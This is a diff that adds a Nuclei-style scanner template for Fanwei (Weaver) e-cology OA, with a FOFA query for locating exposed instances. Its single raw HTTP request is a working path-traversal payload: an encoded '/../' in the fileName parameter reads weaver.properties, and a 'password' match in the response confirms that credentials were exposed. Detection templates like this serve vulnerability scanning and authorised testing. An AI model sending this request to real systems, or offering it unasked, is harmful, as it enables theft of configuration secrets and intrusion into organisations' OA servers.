@@ -1,0 +1,22 @@
+id: FanweiOA-getE9DevelopAllNameValue2
+
+info:
+  name: FanweiOA-getE9DevelopAllNameValue2
+  author: Bingou
+  severity: high
+  metadata:
+    fofa-qeury: app="泛微-OA（e-cology）"
+
+http:
+  - raw:
+      - |
+        GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: Keep-Alive
+
+    matchers:
+      - type: word
+        words:
+          - "password"
+        part: body
